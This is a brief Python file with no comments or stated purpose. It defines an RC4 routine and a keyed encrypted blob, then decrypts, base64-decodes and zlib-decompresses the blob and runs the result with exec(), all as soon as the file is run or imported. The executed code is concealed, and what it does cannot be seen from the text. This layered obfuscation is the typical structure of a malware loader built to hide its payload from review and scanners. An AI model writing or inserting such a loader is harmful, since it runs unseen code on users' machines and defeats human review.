import base64, zlib
def _ksa(key):
    box = list(range(256))
    index = 0
    for position in range(256):
        index = (index + box[position] + key[position % len(key)]) & 0xFF
        box[position], box[index] = box[index], box[position]
    return box
def _rc4(data, key):
    box = _ksa(key)
    out = bytearray()
    first = second = 0
    for byte in data:
        first = (first + 1) & 0xFF
        second = (second + box[first]) & 0xFF
        box[first], box[second] = box[second], box[first]
        out.append(byte ^ box[(box[first] + box[second]) & 0xFF])
    return bytes(out)
_p = b"K3y!8z\x81\x8b%\n\x89\x9fp\xd1\x83\x7f\xd7\x11\x03\xc2\xcfY7\x9dKc8\xd8z\xc2\x19\x84\xbc\xf4y3\n\x10'\xe6~\xeb\x8e{\x1e\xb5t\x05\xca(\xb1\xcbd\xf9\x80\xc0\xc8)\xe9\xbbf+'\x8d\xb9\xcb\xd7\xf1\xe5(=0\xf0z\x80<\xbb\xafA\x08f\x0fD\xa8,|\x8eQ\x9d\r\xa8\xf3\x89?\x0cy\x1b=\xeeb>\x8c#\xd0;\x84<\xd5\xa6*7\xce9\x04.\xbc\x96\x1c\x89\x18O\x9d\xd1\xd3\xfcpU\x93\xe8:\\\x10EY\x94D\xf4 H\xfc\xe0\xca\t\xf1\xc4\x12\xe4\t\x07Q\x92\xf2\xd2\xc8\x121I\xe5\x85\x8c\x91\xbf\x91\x12jE\xc3\xeb\xbfo\x0b.\x8dA|v\x04-7\x93\x8d\x1f\x83\x8d\xc7\xdd\x1ddF\x1d\x0e\x87\xb0\xb0"
exec(zlib.decompress(base64.b64decode(_rc4(_p[6:], _p[:6]))))
